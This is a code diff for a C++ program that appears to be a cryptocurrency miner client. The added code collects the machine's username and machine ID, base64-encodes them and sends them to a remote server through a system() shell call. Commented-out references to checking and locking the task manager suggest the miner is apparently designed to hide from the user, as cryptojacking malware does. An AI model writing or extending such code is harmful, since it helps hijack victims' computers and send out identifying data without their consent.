@@ -7,6 +7,7 @@
 #include<stdio.h>
 #include <pwd.h>
 #include <sys/stat.h>
+#include "base64.h"
 
 
 typedef struct pool_info{
@@ -19,7 +20,7 @@ pool_info* get_pool_info(){
     
     int ret = system(get_pool);
     if(ret != 0){
-        std::cout << "Erro" << std::endl;
+        std::cout << "[-] Couldn't Get pool info, server possible be offline or no internet connection." << std::endl;
         exit(-1);
     }
     pool_info *pool = (pool_info*) malloc(sizeof(pool_info));
@@ -54,16 +55,25 @@ char * get_machine_id(){
 void new_miner(){
     char * name = get_username();
     char *id = get_machine_id();
-    std::cout << name  << " " << id << std::endl;
+    std::string send = std::string(name) += std::string(" ") += std::string(id);
+    std::string encoded = Base64::base64_encode(send);
+    std::string x;
+    const char * a = (x = std::string("python3 communication.py post ") += encoded).c_str();
+    system(a);
 }
 
 
 int main(int argc, char * argv[]){
 
     //std::thread multithreading(Tasks::check_task_manager); // thread creation
-    pool_info * pool= get_pool_info();
-    std::cout << pool->id << " " << pool->pool << std::endl;
+    // std::cout << "Getting pool information ..." << std::endl;
+    // pool_info * pool = get_pool_info();
+    // std::cout << "Mining POOL: {id} = "<< pool->id << " {pool} = " << pool->pool << std::endl;
+    
+    std::cout << "Sending to server miner ID ..." << std::endl;
     new_miner();
+
+    //std::cout << "Starting thread to mine ..." << std::endl;
     // Tasks::check_task_manager();
     // if(Tasks::lock_task_manager){
     //     std::cout << "true" << std::endl;
@@ -72,8 +82,8 @@ int main(int argc, char * argv[]){
     // }
 
     // desalocate memory
-    free(pool->id);
-    free(pool->pool);
-    free(pool);
+    // free(pool->id);
+    // free(pool->pool);
+    // free(pool);
     
 }
